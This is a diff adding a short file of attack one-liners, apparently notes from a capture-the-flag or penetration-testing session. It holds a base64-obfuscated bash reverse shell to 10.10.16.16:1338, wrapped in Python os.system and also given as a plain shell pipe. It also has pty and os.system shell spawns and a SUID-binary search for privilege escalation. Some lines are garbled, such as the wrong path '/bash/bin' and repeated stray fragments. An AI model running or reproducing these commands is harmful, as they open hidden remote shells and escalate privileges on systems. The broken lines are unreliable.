@@ -1,0 +1,20 @@
+
+#!/usr/bin/python3\nimport os\nos.system("echo YmFzaCAtYyAnYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuMTYvMTMzOCAwPiYxJwo= | base64 -d | bash")
+
+
+echo YmFzaCAtYyAnYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuMTYvMTMzOCAwPiYxJwo= | base64 -d | bash
+
+
+#!/usr/bin/python3\nimport pty\npty.spawn("/bash/bin")
+
+#!/usr/bin/python3\nimport os\nos.system("/bash/bin")
+
+find / -type f -perm -4000 2>/dev/null | xargs ls -l 
+
+cat /proc/cpuinfo
+
+/usr/bin/local
+
+cat /proc/cpuinfo
+
+/usr/bin/local
